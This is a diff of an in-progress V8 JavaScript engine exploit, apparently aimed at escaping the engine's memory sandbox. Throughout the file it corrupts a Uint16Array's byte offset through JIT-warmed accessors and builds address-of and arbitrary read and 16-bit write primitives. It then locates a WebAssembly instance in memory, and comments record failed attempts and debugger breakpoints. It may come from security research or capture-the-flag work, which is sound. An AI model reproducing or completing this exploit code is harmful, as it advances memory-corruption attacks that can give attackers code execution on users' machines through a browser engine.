@@ -1,5 +1,7 @@
 // r --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code ../../../tests/test3.js
 
+
+/// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test3.js
 let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
 function addrOf(obj) {
@@ -18,8 +20,9 @@ return sandboxMemory.setBigInt64(Number(addr), val, true);
 const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
 const u16arr = new Uint16Array(gsab);
 
+/// for writing
 function foo(obj, index, val){
-    obj[index] += val;
+    obj[index] = val;
     return obj[index];
 }
 
@@ -27,8 +30,18 @@ function test(iii, val){
     return foo(u16arr, iii, val);
 }
 
+// for reading
+function foo2(obj, index){
+    return obj[index];
+}
+
+function test2(iii){
+    return foo2(u16arr, iii);
+}
+
 for (let i = 0; i < 0x10000; i++) {
     test(1, 0);
+    test2(1);
 }
 let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
 v8_write64(byte_offset_ofs+4n, 0x41414141n);
@@ -48,22 +61,69 @@ let low_ofs_started_page = heap_addr & 0xffffffffn;
 let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
 console.log("heap_addr: 0x" + heap_addr.toString(16));
 
+// ================= reading started array address ===============
+let started_array = v8_read64(addrOf(u16arr) + 0x2f + 1) >> 0x18n;//
+started_array = Number(started_array + high_ofs_started_page);
+console.log("started_array: 0x" + started_array.toString(16));
+console.log("==================================================================");
+
 function arb_read(addr){
     // v8_write64(byte_offset_ofs, addr);
+    let ofs = (addr - started_array) / 2;
+
     
-    return v8_read64(0x4242n);
+    return test2(ofs);
+}
+
+function arb_write16(addr, value){
+    // v8_write64(byte_offset_ofs, addr);
+    let ofs = (addr - started_array) / 2;
+    
+    return test(ofs, value);
 }
 
 
 
-var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-var wasm_mod2 = new WebAssembly.Module(wasm_code2);
-var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
-var f = wasm_instance2.exports.main;
+// https://wasdk.github.io/WasmFiddle/
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
 
-// %DebugPrint(u16arr);
+let wasm_instance_addr = addrOf(wasm_instance);
+console.log("wasm_instance: 0x" + wasm_instance_addr.toString(16));
+
 %DebugPrint(f);
+console.log("==================================================================");
+
+// %SystemBreak();
+
+// for (let i=0; i<10000; i++){
+//     f();
+// }
+%DebugPrint(wasm_instance);
+// f();
 %SystemBreak();
+// console.log("test reading oob: " + arb_read(started_array+0x80010000).toString(16));
+//0x36b800000000
+
+// ======= attemp faild ===========
+// can not read negative offset
+// abort: CSA_DCHECK failed: UintPtrGreaterThanOrEqual(buffer_byte_length, array_byte_offset) [../../src/codegen/code-stub-assembler.cc:16198]
+// console.log("test reading oob: " + arb_read(started_array-0x200000000).toString(16));
+// %DebugPrint(u16arr);
+/// =================================
+
+// %DebugPrint(Math.min);
+// %DebugPrint(f);
+// %SystemBreak();
 
 // access out-of-bounds
-// test(34212359, 0);
+// test(34212359, 0x4343);
+
+
+
+// building arbitrary read primitives
+// should know the address of Uint16Array data_ptr
+
+// b v8/src/runtime/runtime-wasm.cc:805
